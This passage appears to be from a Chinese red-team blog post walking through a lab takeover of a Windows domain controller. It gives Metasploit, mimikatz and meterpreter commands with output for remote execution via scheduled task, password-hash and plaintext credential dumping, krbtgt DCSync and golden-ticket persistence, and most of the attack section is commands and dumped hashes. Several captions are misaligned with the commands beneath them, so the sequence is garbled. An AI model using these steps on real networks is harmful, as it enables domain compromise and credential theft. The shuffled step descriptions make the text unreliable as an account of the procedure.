![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LI8AFrtTO95UQoMGAO7ctPiaaY4Sht0VtXKN6ia5rdYWd44WRZI2d8p9aRicUDndONoEY1vjra4zEplA/640?wx_fmt=png)

接下来使用 copy 命令吧 4567.exe 上传到 dc 的 c 盘下：

```
net time \\\\dc
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LI8AFrtTO95UQoMGAO7ctPiayzZnNcRodwicJdIkE1c5w53Iw0tHktbjK41fiaBXhl6KibvTvM9yqEqTA/640?wx_fmt=png)

由于我们使用的是 at 定时任务让 dc 执行，那么我们需要知道目标系统的时间：

```
\#  让dc再4.35的时候执行c盘下的10000.exe
at \\\\dc 16:47 c:/10000.exe
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LI8AFrtTO95UQoMGAO7ctPiapjIVw9Ufzpl4MJuNApnINibTpVVJQj9KwRQ4EcIFl4whQwECmww845g/640?wx_fmt=png)

那么我们让他创建一个定时任务：

```
use exploit/multi/handler
set payload windows/meterpreter/bind\_tcp
set lport 10000
set rhost 10.10.10.149
exploit
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LI8AFrtTO95UQoMGAO7ctPiaepW4Mibax7QQSEsvVricsG4ueibKiauYGsMuocTPVSPl3rCAQptpQTHZMA/640?wx_fmt=png)

最后使用 MSF 设置监听等待上线：

```
meterpreter > run post/windows/gather/smart\_hashdump 

\[\*\] Running module against DC
\[\*\] Hashes will be saved to the database if one is connected.
\[+\] Hashes will be saved in loot in JtR password file format to:
\[\*\] /root/.msf4/loot/20201115171547\_default\_10.10.10.149\_windows.hashes\_505928.txt
\[+\]     This host is a Domain Controller!
\[\*\] Dumping password hashes...
\[+\]     Administrator:500:aad3b435b51404eeaad3b435b51404ee:ccef208c6485269c20db2cad21734fe7
\[+\]     krbtgt:502:aad3b435b51404eeaad3b435b51404ee:6f60ace6accbcb76078ccc0312174e98
\[+\]     web:1103:aad3b435b51404eeaad3b435b51404ee:086a0bb1ed4ec72250760ea531bf8074
\[+\]     DC$:1000:aad3b435b51404eeaad3b435b51404ee:b5687482bfafb113dc345bb46ef81d69
\[+\]     WEB$:1104:aad3b435b51404eeaad3b435b51404ee:9c85552a37071a3d5cb1323478044b0d
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LI8AFrtTO95UQoMGAO7ctPia5Is23Qz3zojBoBkZEtfXRfjBoBloE2FVQopnZaOsBniar7qibA5d0WVA/640?wx_fmt=png)

上线成功，我们先迁移进程到服务：（维持权限）

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LI8AFrtTO95UQoMGAO7ctPiaeLiaxtHYzk6dySX0qK6W8y4eSa61mrrlxSu77vsuXDrtq5wfKwibW6aw/640?wx_fmt=png)

之后使用模块抓取 dc 的密码 hash:

```
wdigest
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LI8AFrtTO95UQoMGAO7ctPiaVcR3G0WmjR1pheaLPU4vI9LfV3X8Zr0PTHnQsVZk1LP88fjq6Bpo7A/640?wx_fmt=png)

加载 mimikatz 抓取域控明文密码：

```
load mimikatz
load kiwi
kerberos\_ticket\_purge
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LI8AFrtTO95UQoMGAO7ctPiazicAVWcCvfwwiaexRZuAcUMcDlOrAaCWrzISHkJibPcCkoamSTib37h2QA/640?wx_fmt=png)

密码是：Admin12345，到这一步我们的渗透已经完成 %99 了！

只要我们愿意，我们就可以登陆它的远程桌面（一般别用，你们懂的）

* * *

**结尾 - 黄金票据**

最后如果对方改密码了，我们可以通过创建一个黄金票据来进行权限维持：

我们先回到 web 的 session，然后加载 mimikatz 和 kimi 吧 web 内存中的票据清除：

```
wmic useraccount where  get sid
S-1-5-21-2005268815-658469957-1189185684-502
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LI8AFrtTO95UQoMGAO7ctPiaEpFhhGZHUjicTvsGB27HlWA70QsBr6wPn4V4VXMm4TVaYBc0XOyWicyQ/640?wx_fmt=png)

这样就不能访问到目标 dc 了！

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LI8AFrtTO95UQoMGAO7ctPiaLsncm5iayPlk2d9YdwxCljt70OicibEKfr2icibuKUBicveWk40WxUPxHgQw/640?wx_fmt=png)

黄金票据需要获取域名称、域的 sid、域控的 Krbtgt 账号的密码 hash 值，任意域用户！  

```
meterpreter > dcsync\_ntlm krbtgt
\[+\] Account   : krbtgt
\[+\] NTLM Hash : 6f60ace6accbcb76078ccc0312174e98
\[+\] LM Hash   : 36588bd35fd1fe85ec5fd73a1ca6805b
\[+\] SID       : S-1-5-21-2005268815-658469957-1189185684-502
\[+\] RID       : 502
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LI8AFrtTO95UQoMGAO7ctPiaWPnNRFejdicdNadHDRSd2OiaAbDAoP0OXgdqbQDQ1VSI7bAHlPjNvr2g/640?wx_fmt=png)

还有一种方法获取 sid：

```
域名：hackbox.com
域用户：web
krbtgt的sid：S-1-5-21-2005268815-658469957-1189185684-502
krbtgt的ntlm-hash：6f60ace6accbcb76078ccc0312174e98
```

由于我们是系统权限，我们需要切换到域管到权限才能执行下面的命令：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LI8AFrtTO95UQoMGAO7ctPia2buVhicviba6cpeEecQ574r5na8YLHDucvd52zZch2GKCTBh3s3s9TIQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LI8AFrtTO95UQoMGAO7ctPiadxapt15Fhtc1mwYk6nrHtJRUslFbQ0KCDVJvWEiazGxPV4UEnyuAm2g/640?wx_fmt=png)

之后就可以制作黄金票据了：

```
golden\_ticket\_create -d hackbox.com -u web -s S-1-5-21-2005268815-658469957-1189185684 -k 6f60ace6accbcb76078ccc0312174e98 -t /root/krbtgt.ticket
-k  ntlm-hash
-s  krbtgt的sid
-t  导出票据的目录
 sid后面的502不需要写在命令里
```

使用命令导出票据：

```
kerberos\_ticket\_use /root/krbtgt.ticket
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LI8AFrtTO95UQoMGAO7ctPiaAzTghtWwz8qHPMmvCJRMsicsGp7CJVgJpejb5o3hicCknKUhLhSq6LuQ/640?wx_fmt=png)

拿到票据之后我们先切换到 web 的 session，可以看到我们现在是无法访问到 dc 的:

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LI8AFrtTO95UQoMGAO7ctPiapRZVrtfBhfGnID0jibCOUDd8qn5CnXHHibG8wMHG2j6W1XlBQgfibLFJQ/640?wx_fmt=png)

我们接下来就可以导入黄金票据：

```
kerberos\_ticket\_use /root/krbtgt.ticket
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LI8AFrtTO95UQoMGAO7ctPiaU3nyDJOEYNpdN2jSuzGiaB94NdKg6kIhpEsODS8WJWS7zV4Hh5L2icGw/640?wx_fmt=png)

这个时候我们就可以一直访问得到 dc 了：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LI8AFrtTO95UQoMGAO7ctPia58dUOjSFVPWlmaCq6Tj0MI0icGHnCQgCoehnxX75YzFGa5iaKchHtX0w/640?wx_fmt=png)

最终在域控下拿到了 flag：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LI8AFrtTO95UQoMGAO7ctPia58dUOjSFVPWlmaCq6Tj0MI0icGHnCQgCoehnxX75YzFGa5iaKchHtX0w/640?wx_fmt=png)

* * *

渗透攻击红队 发起了一个读者讨论 你学到东西了吗？ 精选讨论内容

了解一下 Kerberos 协议你就懂了

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)  

渗透攻击红队

一个专注于渗透红队攻击的公众号

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/dzeEUCA16LKwvIuOmsoicpffk7N0cVibfDdjBqfzUWVgkVA7dFfxUAATDhZQicc1ibtgzSVq7sln6r9kEtTTicvZmcw/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKwvIuOmsoicpffk7N0cVibfDY9HXLCT5WoDFzKP1Dw8FZyt3ecOVF0zSDogBTzgN2wicJlRDygN7bfQ/640?wx_fmt=png)

点分享

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKwvIuOmsoicpffk7N0cVibfDRwPQ2H3KRtgzicHGD2bGf1Dtqr86B5mspl4gARTicQUaVr6N0rY1GgKQ/640?wx_fmt=png)

点点赞

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKwvIuOmsoicpffk7N0cVibfDgRo5uRP3s5pLrlJym85cYvUZRJDlqbTXHYVGXEZqD67ia9jNmwbNgxg/640?wx_fmt=png)

点在看